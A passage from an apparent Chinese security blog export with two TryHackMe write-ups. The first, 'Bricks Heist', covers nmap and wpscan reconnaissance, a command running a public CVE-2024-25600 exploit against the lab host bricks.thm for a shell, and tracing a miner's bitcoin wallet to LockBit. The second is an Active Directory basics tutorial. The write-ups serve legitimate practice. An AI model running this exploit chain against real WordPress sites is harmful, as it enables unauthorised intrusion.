第四步\n我们跑一下这个文件 就可以获得这个网站的shell 然后查看题目需要的文件是否存在\n\n```\npython3 CVE-2024-25600.py -u https://bricks.thm\n\n```\n**-u** / --url：指定目标 URL。用于设置你要扫描的 Web 地址。\n\n![loudong](/images/Bricks-Heist-教程/flag.png)\n\n刚进去就发现一个可疑文件 直接cat查看一下 发现第一问解出来了 flag到手\n\n第二题看可疑进程和进程的服务名\n\n我们先**ps aux**查看一下 但发现太多了 我们进一步筛选 查找一下正在运行中的服务\n\n```\nsystemctl | grep running\n```\n\n![run](/images/Bricks-Heist-教程/jingcheng.png)\n\n我们在里面发现了一个可疑进程 然后systemctl查一下具体信息\n\n![run](/images/Bricks-Heist-教程/jingcheng1.png)\n\n![run](/images/Bricks-Heist-教程/jiingcheng3.png)\n\n就发现了可疑进程是nm-inet-dialog 服务名叫做ubuntu.service\n\n## 第五步\n要看日志文件叫什么名字 在刚才的查询中发现这个服务在/lib/networkmanager的inet.conf\n\n```\nhead /lib/networkmanager/inet.conf\n```\n\n![head](/images/Bricks-Heist-教程/inet.png)\n\n发现id是个复杂的加密 把这串id复制到cyberchef中 这个id进行了十六进制转换 再来两次base64的转换\n\n![cyber](/images/Bricks-Heist-教程/bitcoiin.png)\n\n得出来的结果分成一般就是我们需要的钱包地址\n\n## 最后一步\n\n我们知道比特币地址之后 在www.blockchain.com中搜索一下地址 查询一下他的交易流程 发现一个地址频繁出现 我们把这个地址复制 搜索一下 \n\n![bit](/images/Bricks-Heist-教程/bit.png)\n\n搜完之后 随便点了一个链接 得知是lockbit组织\n\n![bit](/images/Bricks-Heist-教程/lockbit.png)\n\n\n这个练习挺好玩的 用到了wpscan nmap和反向提权 其实在python的那一步 反向提权一下会更方便一点 可能我不太熟练吧 就直接这么查找需要的东西了\n\n\n\n\n\n\n\n\n\n\n\n\n\n","source":"_posts/Bricks-Heist-教程.md","raw":"---\ntitle: Bricks Heist 教程\ndate: 2025-01-25 22:12:02\ntags: linux 渗透\ntop_img: transparent\ncover: https://s2.loli.net/2025/02/01/9PhqARN1ybnjfkJ.jpg\n---\n### 祝师傅们2025越来越好 技术越来越牛 \n\n# Bricks Heist教程\n我们看一下Bricks Heist 这个简单挑战\n![title](/images/Bricks-Heist-教程/title.png)\n\n这个是题目\n\n![title](/images/Bricks-Heist-教程/ask.png)\n\n我们先把自己的机子ip和bricks.thm绑到/etc/hosts里面\n\n![hosts](/images/Bricks-Heist-教程/hosts.png)\n\n连接上openvpn之后咱正式开搞\n\n## 第一步\n先nmap开扫 可以看到他们开放了22，80和443端口\n\n![nmap](/images/Bricks-Heist-教程/nmap.png)\n\n![nmap](/images/Bricks-Heist-教程/duankou.png)\n\n\n## 第二步\n我们在浏览器那搜索ip地址和域名 看一下有什么结果吗\n\n直接输ip的话是啥也没有\n\n![ip](/images/Bricks-Heist-教程/ip.png)\n\n我们换成域名试一试 发现成功了\n\n![brick](/images/Bricks-Heist-教程/brick.png)\n\n\n## 第三步\n我们把这个拉到wpscan里面扫描一下\n\n```\nwpscan --url https://bricks.thm/ --disable-ssl-checks\n```\n\n为什么要加--disable-ssl-checks这个参数捏 不加的话他会报错 说目标网站的 SSL/TLS 证书不正确或无法验证\n\n![scan](/images/Bricks-Heist-教程/scan1.png)\n\n<strong>--disable-ssl-checks</strong> 参数可以让你在面对无效证书（如自签名证书、过期证书等）时继续进行扫描，跳过 SSL/TLS 证书验证检查。\n\n扫描结果我们可以发现在robots.txt中有两个可疑的路径\n\n![scan](/images/Bricks-Heist-教程/wpscan.png)\n\n第二个呢 就是wordpess的主题 bricks和主题版本1.9.5\n\n![scan](/images/Bricks-Heist-教程/wpscan3.png)\n\n结合这两个信息 咱可以在浏览器搜搜有什么漏洞吗 成功发现一个 把他的python下载到机子里面\n\n![loudong](/images/Bricks-Heist-教程/ludong.png)\n\n## 第四步\n我们跑一下这个文件 就可以获得这个网站的shell 然后查看题目需要的文件是否存在\n\n```\npython3 CVE-2024-25600.py -u https://bricks.thm\n\n```\n**-u** / --url：指定目标 URL。用于设置你要扫描的 Web 地址。\n\n![loudong](/images/Bricks-Heist-教程/flag.png)\n\n刚进去就发现一个可疑文件 直接cat查看一下 发现第一问解出来了 flag到手\n\n第二题看可疑进程和进程的服务名\n\n我们先**ps aux**查看一下 但发现太多了 我们进一步筛选 查找一下正在运行中的服务\n\n```\nsystemctl | grep running\n```\n\n![run](/images/Bricks-Heist-教程/jingcheng.png)\n\n我们在里面发现了一个可疑进程 然后systemctl查一下具体信息\n\n![run](/images/Bricks-Heist-教程/jingcheng1.png)\n\n![run](/images/Bricks-Heist-教程/jiingcheng3.png)\n\n就发现了可疑进程是nm-inet-dialog 服务名叫做ubuntu.service\n\n## 第五步\n要看日志文件叫什么名字 在刚才的查询中发现这个服务在/lib/networkmanager的inet.conf\n\n```\nhead /lib/networkmanager/inet.conf\n```\n\n![head](/images/Bricks-Heist-教程/inet.png)\n\n发现id是个复杂的加密 把这串id复制到cyberchef中 这个id进行了十六进制转换 再来两次base64的转换\n\n![cyber](/images/Bricks-Heist-教程/bitcoiin.png)\n\n得出来的结果分成一般就是我们需要的钱包地址\n\n## 最后一步\n\n我们知道比特币地址之后 在www.blockchain.com中搜索一下地址 查询一下他的交易流程 发现一个地址频繁出现 我们把这个地址复制 搜索一下 \n\n![bit](/images/Bricks-Heist-教程/bit.png)\n\n搜完之后 随便点了一个链接 得知是lockbit组织\n\n![bit](/images/Bricks-Heist-教程/lockbit.png)\n\n\n这个练习挺好玩的 用到了wpscan nmap和反向提权 其实在python的那一步 反向提权一下会更方便一点 可能我不太熟练吧 就直接这么查找需要的东西了\n\n\n\n\n\n\n\n\n\n\n\n\n\n","slug":"Bricks-Heist-教程","published":1,"updated":"2025-02-01T10:46:28.238Z","comments":1,"layout":"post","photos":[],"_id":"cm74njvx60001tsg6183fgsbs","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><h3 id=\"祝师傅们2025越来越好-技术越来越牛\"><a href=\"#祝师傅们2025越来越好-技术越来越牛\" class=\"headerlink\" title=\"祝师傅们2025越来越好 技术越来越牛\"></a>祝师傅们2025越来越好 技术越来越牛</h3><h1 id=\"Bricks-Heist教程\"><a href=\"#Bricks-Heist教程\" class=\"headerlink\" title=\"Bricks Heist教程\"></a>Bricks Heist教程</h1><p>我们看一下Bricks Heist 这个简单挑战<br><img src=\"/images/Bricks-Heist-%E6%95%99%E7%A8%8B/title.png\" alt=\"title\"></p>\n<p>这个是题目</p>\n<p><img src=\"/images/Bricks-Heist-%E6%95%99%E7%A8%8B/ask.png\" alt=\"title\"></p>\n<p>我们先把自己的机子ip和bricks.thm绑到&#x2F;etc&#x2F;hosts里面</p>\n<p><img src=\"/images/Bricks-Heist-%E6%95%99%E7%A8%8B/hosts.png\" alt=\"hosts\"></p>\n<p>连接上openvpn之后咱正式开搞</p>\n<h2 id=\"第一步\"><a href=\"#第一步\" class=\"headerlink\" title=\"第一步\"></a>第一步</h2><p>先nmap开扫 可以看到他们开放了22，80和443端口</p>\n<p><img src=\"/images/Bricks-Heist-%E6%95%99%E7%A8%8B/nmap.png\" alt=\"nmap\"></p>\n<p><img src=\"/images/Bricks-Heist-%E6%95%99%E7%A8%8B/duankou.png\" alt=\"nmap\"></p>\n<h2 id=\"第二步\"><a href=\"#第二步\" class=\"headerlink\" title=\"第二步\"></a>第二步</h2><p>我们在浏览器那搜索ip地址和域名 看一下有什么结果吗</p>\n<p>直接输ip的话是啥也没有</p>\n<p><img src=\"/images/Bricks-Heist-%E6%95%99%E7%A8%8B/ip.png\" alt=\"ip\"></p>\n<p>我们换成域名试一试 发现成功了</p>\n<p><img src=\"/images/Bricks-Heist-%E6%95%99%E7%A8%8B/brick.png\" alt=\"brick\"></p>\n<h2 id=\"第三步\"><a href=\"#第三步\" class=\"headerlink\" title=\"第三步\"></a>第三步</h2><p>我们把这个拉到wpscan里面扫描一下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wpscan --url https://bricks.thm/ --disable-ssl-checks</span><br></pre></td></tr></table></figure>\n\n<p>为什么要加–disable-ssl-checks这个参数捏 不加的话他会报错 说目标网站的 SSL&#x2F;TLS 证书不正确或无法验证</p>\n<p><img src=\"/images/Bricks-Heist-%E6%95%99%E7%A8%8B/scan1.png\" alt=\"scan\"></p>\n<p><strong>–disable-ssl-checks</strong> 参数可以让你在面对无效证书（如自签名证书、过期证书等）时继续进行扫描，跳过 SSL&#x2F;TLS 证书验证检查。</p>\n<p>扫描结果我们可以发现在robots.txt中有两个可疑的路径</p>\n<p><img src=\"/images/Bricks-Heist-%E6%95%99%E7%A8%8B/wpscan.png\" alt=\"scan\"></p>\n<p>第二个呢 就是wordpess的主题 bricks和主题版本1.9.5</p>\n<p><img src=\"/images/Bricks-Heist-%E6%95%99%E7%A8%8B/wpscan3.png\" alt=\"scan\"></p>\n<p>结合这两个信息 咱可以在浏览器搜搜有什么漏洞吗 成功发现一个 把他的python下载到机子里面</p>\n<p><img src=\"/images/Bricks-Heist-%E6%95%99%E7%A8%8B/ludong.png\" alt=\"loudong\"></p>\n<h2 id=\"第四步\"><a href=\"#第四步\" class=\"headerlink\" title=\"第四步\"></a>第四步</h2><p>我们跑一下这个文件 就可以获得这个网站的shell 然后查看题目需要的文件是否存在</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 CVE-2024-25600.py -u https://bricks.thm</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><strong>-u</strong> &#x2F; –url：指定目标 URL。用于设置你要扫描的 Web 地址。</p>\n<p><img src=\"/images/Bricks-Heist-%E6%95%99%E7%A8%8B/flag.png\" alt=\"loudong\"></p>\n<p>刚进去就发现一个可疑文件 直接cat查看一下 发现第一问解出来了 flag到手</p>\n<p>第二题看可疑进程和进程的服务名</p>\n<p>我们先<strong>ps aux</strong>查看一下 但发现太多了 我们进一步筛选 查找一下正在运行中的服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl | grep running</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Bricks-Heist-%E6%95%99%E7%A8%8B/jingcheng.png\" alt=\"run\"></p>\n<p>我们在里面发现了一个可疑进程 然后systemctl查一下具体信息</p>\n<p><img src=\"/images/Bricks-Heist-%E6%95%99%E7%A8%8B/jingcheng1.png\" alt=\"run\"></p>\n<p><img src=\"/images/Bricks-Heist-%E6%95%99%E7%A8%8B/jiingcheng3.png\" alt=\"run\"></p>\n<p>就发现了可疑进程是nm-inet-dialog 服务名叫做ubuntu.service</p>\n<h2 id=\"第五步\"><a href=\"#第五步\" class=\"headerlink\" title=\"第五步\"></a>第五步</h2><p>要看日志文件叫什么名字 在刚才的查询中发现这个服务在&#x2F;lib&#x2F;networkmanager的inet.conf</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">head /lib/networkmanager/inet.conf</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Bricks-Heist-%E6%95%99%E7%A8%8B/inet.png\" alt=\"head\"></p>\n<p>发现id是个复杂的加密 把这串id复制到cyberchef中 这个id进行了十六进制转换 再来两次base64的转换</p>\n<p><img src=\"/images/Bricks-Heist-%E6%95%99%E7%A8%8B/bitcoiin.png\" alt=\"cyber\"></p>\n<p>得出来的结果分成一般就是我们需要的钱包地址</p>\n<h2 id=\"最后一步\"><a href=\"#最后一步\" class=\"headerlink\" title=\"最后一步\"></a>最后一步</h2><p>我们知道比特币地址之后 在<a href=\"http://www.blockchain.com中搜索一下地址/\">www.blockchain.com中搜索一下地址</a> 查询一下他的交易流程 发现一个地址频繁出现 我们把这个地址复制 搜索一下 </p>\n<p><img src=\"/images/Bricks-Heist-%E6%95%99%E7%A8%8B/bit.png\" alt=\"bit\"></p>\n<p>搜完之后 随便点了一个链接 得知是lockbit组织</p>\n<p><img src=\"/images/Bricks-Heist-%E6%95%99%E7%A8%8B/lockbit.png\" alt=\"bit\"></p>\n<p>这个练习挺好玩的 用到了wpscan nmap和反向提权 其实在python的那一步 反向提权一下会更方便一点 可能我不太熟练吧 就直接这么查找需要的东西了</p>\n","excerpt":"","more":"<h3 id=\"祝师傅们2025越来越好-技术越来越牛\"><a href=\"#祝师傅们2025越来越好-技术越来越牛\" class=\"headerlink\" title=\"祝师傅们2025越来越好 技术越来越牛\"></a>祝师傅们2025越来越好 技术越来越牛</h3><h1 id=\"Bricks-Heist教程\"><a href=\"#Bricks-Heist教程\" class=\"headerlink\" title=\"Bricks Heist教程\"></a>Bricks Heist教程</h1><p>我们看一下Bricks Heist 这个简单挑战<br><img src=\"/images/Bricks-Heist-%E6%95%99%E7%A8%8B/title.png\" alt=\"title\"></p>\n<p>这个是题目</p>\n<p><img src=\"/images/Bricks-Heist-%E6%95%99%E7%A8%8B/ask.png\" alt=\"title\"></p>\n<p>我们先把自己的机子ip和bricks.thm绑到&#x2F;etc&#x2F;hosts里面</p>\n<p><img src=\"/images/Bricks-Heist-%E6%95%99%E7%A8%8B/hosts.png\" alt=\"hosts\"></p>\n<p>连接上openvpn之后咱正式开搞</p>\n<h2 id=\"第一步\"><a href=\"#第一步\" class=\"headerlink\" title=\"第一步\"></a>第一步</h2><p>先nmap开扫 可以看到他们开放了22，80和443端口</p>\n<p><img src=\"/images/Bricks-Heist-%E6%95%99%E7%A8%8B/nmap.png\" alt=\"nmap\"></p>\n<p><img src=\"/images/Bricks-Heist-%E6%95%99%E7%A8%8B/duankou.png\" alt=\"nmap\"></p>\n<h2 id=\"第二步\"><a href=\"#第二步\" class=\"headerlink\" title=\"第二步\"></a>第二步</h2><p>我们在浏览器那搜索ip地址和域名 看一下有什么结果吗</p>\n<p>直接输ip的话是啥也没有</p>\n<p><img src=\"/images/Bricks-Heist-%E6%95%99%E7%A8%8B/ip.png\" alt=\"ip\"></p>\n<p>我们换成域名试一试 发现成功了</p>\n<p><img src=\"/images/Bricks-Heist-%E6%95%99%E7%A8%8B/brick.png\" alt=\"brick\"></p>\n<h2 id=\"第三步\"><a href=\"#第三步\" class=\"headerlink\" title=\"第三步\"></a>第三步</h2><p>我们把这个拉到wpscan里面扫描一下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wpscan --url https://bricks.thm/ --disable-ssl-checks</span><br></pre></td></tr></table></figure>\n\n<p>为什么要加–disable-ssl-checks这个参数捏 不加的话他会报错 说目标网站的 SSL&#x2F;TLS 证书不正确或无法验证</p>\n<p><img src=\"/images/Bricks-Heist-%E6%95%99%E7%A8%8B/scan1.png\" alt=\"scan\"></p>\n<p><strong>–disable-ssl-checks</strong> 参数可以让你在面对无效证书（如自签名证书、过期证书等）时继续进行扫描，跳过 SSL&#x2F;TLS 证书验证检查。</p>\n<p>扫描结果我们可以发现在robots.txt中有两个可疑的路径</p>\n<p><img src=\"/images/Bricks-Heist-%E6%95%99%E7%A8%8B/wpscan.png\" alt=\"scan\"></p>\n<p>第二个呢 就是wordpess的主题 bricks和主题版本1.9.5</p>\n<p><img src=\"/images/Bricks-Heist-%E6%95%99%E7%A8%8B/wpscan3.png\" alt=\"scan\"></p>\n<p>结合这两个信息 咱可以在浏览器搜搜有什么漏洞吗 成功发现一个 把他的python下载到机子里面</p>\n<p><img src=\"/images/Bricks-Heist-%E6%95%99%E7%A8%8B/ludong.png\" alt=\"loudong\"></p>\n<h2 id=\"第四步\"><a href=\"#第四步\" class=\"headerlink\" title=\"第四步\"></a>第四步</h2><p>我们跑一下这个文件 就可以获得这个网站的shell 然后查看题目需要的文件是否存在</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 CVE-2024-25600.py -u https://bricks.thm</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><strong>-u</strong> &#x2F; –url：指定目标 URL。用于设置你要扫描的 Web 地址。</p>\n<p><img src=\"/images/Bricks-Heist-%E6%95%99%E7%A8%8B/flag.png\" alt=\"loudong\"></p>\n<p>刚进去就发现一个可疑文件 直接cat查看一下 发现第一问解出来了 flag到手</p>\n<p>第二题看可疑进程和进程的服务名</p>\n<p>我们先<strong>ps aux</strong>查看一下 但发现太多了 我们进一步筛选 查找一下正在运行中的服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl | grep running</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Bricks-Heist-%E6%95%99%E7%A8%8B/jingcheng.png\" alt=\"run\"></p>\n<p>我们在里面发现了一个可疑进程 然后systemctl查一下具体信息</p>\n<p><img src=\"/images/Bricks-Heist-%E6%95%99%E7%A8%8B/jingcheng1.png\" alt=\"run\"></p>\n<p><img src=\"/images/Bricks-Heist-%E6%95%99%E7%A8%8B/jiingcheng3.png\" alt=\"run\"></p>\n<p>就发现了可疑进程是nm-inet-dialog 服务名叫做ubuntu.service</p>\n<h2 id=\"第五步\"><a href=\"#第五步\" class=\"headerlink\" title=\"第五步\"></a>第五步</h2><p>要看日志文件叫什么名字 在刚才的查询中发现这个服务在&#x2F;lib&#x2F;networkmanager的inet.conf</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">head /lib/networkmanager/inet.conf</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Bricks-Heist-%E6%95%99%E7%A8%8B/inet.png\" alt=\"head\"></p>\n<p>发现id是个复杂的加密 把这串id复制到cyberchef中 这个id进行了十六进制转换 再来两次base64的转换</p>\n<p><img src=\"/images/Bricks-Heist-%E6%95%99%E7%A8%8B/bitcoiin.png\" alt=\"cyber\"></p>\n<p>得出来的结果分成一般就是我们需要的钱包地址</p>\n<h2 id=\"最后一步\"><a href=\"#最后一步\" class=\"headerlink\" title=\"最后一步\"></a>最后一步</h2><p>我们知道比特币地址之后 在<a href=\"http://www.blockchain.com中搜索一下地址/\">www.blockchain.com中搜索一下地址</a> 查询一下他的交易流程 发现一个地址频繁出现 我们把这个地址复制 搜索一下 </p>\n<p><img src=\"/images/Bricks-Heist-%E6%95%99%E7%A8%8B/bit.png\" alt=\"bit\"></p>\n<p>搜完之后 随便点了一个链接 得知是lockbit组织</p>\n<p><img src=\"/images/Bricks-Heist-%E6%95%99%E7%A8%8B/lockbit.png\" alt=\"bit\"></p>\n<p>这个练习挺好玩的 用到了wpscan nmap和反向提权 其实在python的那一步 反向提权一下会更方便一点 可能我不太熟练吧 就直接这么查找需要的东西了</p>\n"},{"title":"Active Directory Basics教程","date":"2025-01-20T01:40:15.000Z","top_img":"transparent","cover":"https://s2.loli.net/2025/01/20/Gb4AzgHWJMQimCo.jpg","_content":"\nActive Directory Basics教程\n这个只能说没遇到过 在未来工作管理中还蛮适合的 就是可以管理用户和计算机的好工具 \n\n![ad](/images/Active-Directory-Basics教程/title.png)\n\n**Active Directory**（活动目录）是微软Windows操作系统中用于存储网络资源信息和管理网络用户权限的一种目录服务。它在企业级网络环境中广泛使用，主要用于集中管理用户账户、计算机、组织单位、组策略等网络资源。\n\nWindows 计算机网络的通用组件的管理集中在一个名为**Active Directory  ( AD )** 的存储库中。运行 Active Directory 服务的服务器称为**Domain Controller 域控制器 ( DC )。**\n\n## Active Directory作用\n- 1.**集中管理用户和计算机**：Active Directory可以集中管理网络中的用户账户和计算机。管理员可以通过它创建、修改、删除用户账户和计算机账户，统一管理用户的登录权限和计算机的访问权限。\n<br>  \n- 2.**组织单位管理**：可以创建组织单位（OU），将用户和计算机按部门、地理位置等进行分类管理，方便对不同组织单位应用不同的策略和管理操作。\n<br>\n- 3.**组策略应用**：通过Active Directory可以将组策略应用到用户和计算机上。组策略可以控制用户的桌面环境、软件安装、安全设置等，实现对网络环境的统一配置和管理。\n<br>\n- 4.**资源访问控制**：可以设置用户对网络资源（如文件服务器、打印机等）的访问权限，确保只有授权用户可以访问特定资源。\n<br>\n- 5.**身份验证和授权**：Active Directory提供身份验证和授权机制，确保用户在登录网络时的身份合法性，并根据用户的权限进行授权操作。\n\n\n科普完之后咱开始看题\n## task2\n\n![task2](/images/Active-Directory-Basics教程/task2.png)\n\n这一题就是科普题\n\n1.在Windows域中，凭据被存储在一个的集中式存储库 存储库叫什么名字？\n\nActive Directory\n\n2.负责运行Active Directory服务的服务器被称为？\n\nDomain Controller\n\n\n## task3\n\n先看看怎么打开ad吧 在电脑中找了一波 就是没发现ad在哪。在问过大模型之后 发现AD是运行在Windows Server上的服务。我们电脑应该应该没 真的要这个功能需要下载 搞很多东西 这里就不搞了\n\n这个是ad的默认组\n- **域管理员(Domain Admins)**\t该组的用户拥有整个域的管理权限。默认情况下，他们可以管理域中的任何计算机，包括 DC。\n- **务器操作员(Server Operators)**\t此组中的用户可以管理域控制器。他们无法更改任何管理组成员身份。\n- **份操作员(Backup Operators)**\t此组中的用户可以访问任何文件，而不受其权限的限制。它们用于执行计算机上的数据备份。\n- **账户操作员(Account Operators)**\t该组中的用户可以创建或修改域中的其他帐户。\n- **域用户(Domain Users)**\t包括域中所有现有的用户帐户。\n- **域计算机(Domain Computers)**\t包括域中所有现有的计算机。\n- **域控制器(Domain Controllers)**\t包括域中所有现有的 DC。\n\n识别机器帐户相对容易。它们遵循特定的命名方案。机器帐户名称是计算机的名称后跟美元符号。例如，名为的机器DC01将有一个名为的机器帐户**DC01$**。\n\n![task](/images/Active-Directory-Basics教程/task3.png)\n\n我们接着看看task3的题目 依旧科普题\n\n1.**Domain Admins** 该组的用户拥有整个域的管理权限 一般可以直接管理所有计算机\n\n2.**\"tom-pc$\"**  命名这些机器账户就是在名字后面加个美元符号\n\n第三题就是 organizational units\n\n## task4\n![task4](/images/Active-Directory-Basics教程/task4.png)\n\n我们来看第一问 我们现在windows的搜索框搜一下这个\n\n![task4](/images/Active-Directory-Basics教程/group.png)\n\n进去之后 我们随便点一下文件 出现以下的框框 点击第一个\n\n![task4](/images/Active-Directory-Basics教程/ad1.png)\n\n我们点击add 添加philip这个用户(题目提供了这个账户给我们) 给他给别的用户重设密码的权限\n\n![task4](/images/Active-Directory-Basics教程/ad2.png)\n\n![task4](/images/Active-Directory-Basics教程/ad3.png)\n\n改完之后我们远程登录phillip ip就是tryhackme提供的ip\n\n![task4](/images/Active-Directory-Basics教程/rd.png)\n\n![task4](/images/Active-Directory-Basics教程/login.png)\n\n登录之后我们用powershell来重设shphile的账户 **记住密码要符合一定的复杂程度！**\n\n```\nSet-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose\n```\n\n\n```\nSet-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose\n```\n\n![task4](/images/Active-Directory-Basics教程/setpasswd.png)\n\n一切就绪 我们开始远程登录\n\n![login](/images/Active-Directory-Basics教程/sophlogin.png)\n\n进入桌面就能看到flag\n\n![login](/images/Active-Directory-Basics教程/flag.png)\n\n第二问 向用户授予某些 OU 或其他 AD 对象的权限的过程称为\n**delegation**\n\n## task5\n\n![task5](/images/Active-Directory-Basics教程/task5.png)\n\n第一问挺有意思的 \n\n只能说我一开始是没搞明白啥意思\n\n我们在Windows的搜索栏搜一下users\n\n![task5](/images/Active-Directory-Basics教程/group.png)\n\n点进去照着图这么设置 显示出所有的东西\n\n![task5](/images/Active-Directory-Basics教程/fix.png)\n\n找到computer这个组\n\n![task5](/images/Active-Directory-Basics教程/fix2.png)\n\n将这里的勾去掉\n\n![task5](/images/Active-Directory-Basics教程/fix3.png)\n\n然后点击thm.local 新建两个文件一个是servers另一个是workstations\n\n![task5](/images/Active-Directory-Basics教程/fixxx.png)\n\n恭喜~~你被我恭喜到了~~以上是让你熟悉熟悉操作的 打开computer那个组 把s开头的那几个减掉 就是第一题的答案\n\n第二题当然是yay\n\n## task6\nWindows 通过**组策略对象** ( GPO )管理此类策略。GPO 只是可应用于 **OU**的设置集合。GPO 可以包含针对用户或计算机的策略，\n\nGPO 通过名为 的网络共享分发到网络**SYSVOL**，该共享存储在 DC 中。域中的所有用户通常都应能够通过网络访问此共享，以定期同步其 GPO。SYSVOL 共享默认指向C:\\Windows\\SYSVOL\\sysvol\\我们网络中每个 DC 上的目录。\n\n```\ngpupdate /force\n``` \n\n我们看一下题目\n\n![](/images/Active-Directory-Basics教程/task6.png)\n\n第一题是通过sysvol将gpo分发到域机器\n\n第二题 gpo可以将设置应用在用户和计算机\n\n## task7\n\n身份验证方法\n\nWindows 域中的网络身份验证可以使用两种协议：\n**Kerberos**：任何较新版本的 Windows 均使用此协议。这是任何较新域中的默认协议。\n\n**NetNTLM**：为了兼容性目的而保留的旧式身份验证协议。\n\n### Kerberos身份验证\n\nKerberos身份验证是 Windows 最新版本的默认身份验证协议。使用Kerberos登录服务的用户将被分配票证。将票证视为先前身份验证的证明。拥有票证的用户可以将其出示给服务，以证明他们之前已通过网络身份验证，因此可以使用该服务。\n\n当使用Kerberos进行身份验证时，会发生以下过​​程：\n\n#### 第一步\n用户将其用户名和使用从其密码派生的密钥加密的**时间戳**发送到**密钥分发中心 (KDC)**，kdc负责在网络上创建**Kerberos票证**。\n\n**KDC**将创建并返回一个票证授予**票证 ( TGT )**，这将允许用户请求更多票证以访问特定服务。需要票证才能获得更多票证听起来可能有点奇怪，但它允许用户在每次想要连接到服务时请求服务票证而无需传递其凭据。除了 TGT 之外，还会向用户提供会话密钥，他们将需要该密钥来生成以下请求。\n\n\n#### 第二步\n\n当用户想要连接到网络上的服务（如共享、网站或数据库）时，他们将使用其TGT向 KDC 请求**票证授予服务 (TGS)**。TGS 是仅允许连接到为其创建的特定服务的票证。要请求 TGS，用户将发送使用会话密钥加密的用户名和时间戳，以及 TGT和服务主体名称 (SPN)，后者指示我们打算访问的服务和服务器名称。\n\n因此，KDC 将向我们发送 TGS 以及服务会话密钥，我们需要该密钥来验证我们要访问的服务。TGS 使用从 服务所有者哈希派生的密钥进行加密。服务所有者是服务在其下运行的用户或机器帐户。TGS 在其加密内容中包含服务会话密钥的副本，以便服务所有者可以通过解密 TGS 来访问它。\n\n\n#### 第三步\n然后，TGS 可以发送到所需的服务以进行身份​​验证并建立连接。该服务将使用其配置的帐户的密码哈希来解密 TGS 并验证服务会话密钥。\n\n\n### NetNTLM 身份验证\n\nNetNTLM 采用质询-响应机制。 整个过程如下：\n\n1.客户端向其想要访问的服务器发送身份验证请求。\n2.服务器生成一个随机数并将其作为挑战发送给客户端。\n3.客户端将其NTLM密码哈希与质询（和其他已知数据）相结合，以生成对质询的响应并将其发送回服务器进行验证。\n4.服务器将质询和响应转发给域控制器进行验证。\n5.域控制器使用该质询重新计算响应，并将其与客户端发送的原始响应进行比较。 如果两者匹配，则客户端通过身份验证； 否则，访问被拒绝。 身份验证结果将发送回服务器。\n6.服务器将认证结果转发给客户端。\n\n请注意，出于安全考虑，用户的密码（或哈希值）绝不会通过网络传输。\n\n---\n任务七的题目在这\n\n![task7](/images/Active-Directory-Basics教程/task7.png)\n\n第一题 Windows是默认使用**Kerberos** 所以填nay\n\n第二题 当用户想要连接到网络上的服务（如共享、网站或数据库）时，他们将使用其**TGT**向 KDC 请求票证授予服务 (TGS) tgt就是答案\n\n第三题 密码不会通过网络传输 填nay\n\n## task8\n\ntrees forests and trusts\n### trees\n\nActive Directory 支持集成多个域，这样就可以将网络划分为可以独立管理的单元。如果您有两个共享**相同命名空间**的域，则可以将这些域合并为一个**tree(树)**。\n\n![tree](/images/Active-Directory-Basics教程/tree.png)\n\n### forests\n\n将具有**不同命名空间**的多个树合并到**同一个网络**中称为**forest森林**。\n\n![forest](/images/Active-Directory-Basics教程/forest.png)\n\n### trusts\n\n以树和森林形式组织的多个域可让您在管理和资源方面拥有良好的分区网络。但在某个时候，alice的用户可能需要访问bob 服务器之一中的共享文件。为此，以树和森林形式组织的域通过信任关系连接在一起。\n\n还可以建立双向信任关系，以允许两个域相互授权对方的用户。默认情况下，将多个域加入一棵树或一个森林下将形成双向信任关系。\n\n![task8](/images/Active-Directory-Basics教程/8.png)\n\n第一题就是tree\n第二题是a trust relationship   \n\n也算是做完这个了 就是熟悉活动目录 以及对用户和组的一些管理 了解了解一些功能。太太太粪怪了 没多大意思","source":"_posts/Active-Directory-Basics教程.md","raw":"---\ntitle: Active Directory Basics教程\ndate: 2025-01-20 09:40:15\ntags: Windows 用户与组 管理\ntop_img: transparent\ncover: https://s2.loli.net/2025/01/20/Gb4AzgHWJMQimCo.jpg\n---\n\nActive Directory Basics教程\n这个只能说没遇到过 在未来工作管理中还蛮适合的 就是可以管理用户和计算机的好工具 \n\n![ad](/images/Active-Directory-Basics教程/title.png)\n\n**Active Directory**（活动目录）是微软Windows操作系统中用于存储网络资源信息和管理网络用户权限的一种目录服务。它在企业级网络环境中广泛使用，主要用于集中管理用户账户、计算机、组织单位、组策略等网络资源。\n\nWindows 计算机网络的通用组件的管理集中在一个名为**Active Directory  ( AD )** 的存储库中。运行 Active Directory 服务的服务器称为**Domain Controller 域控制器 ( DC )。**\n\n## Active Directory作用\n- 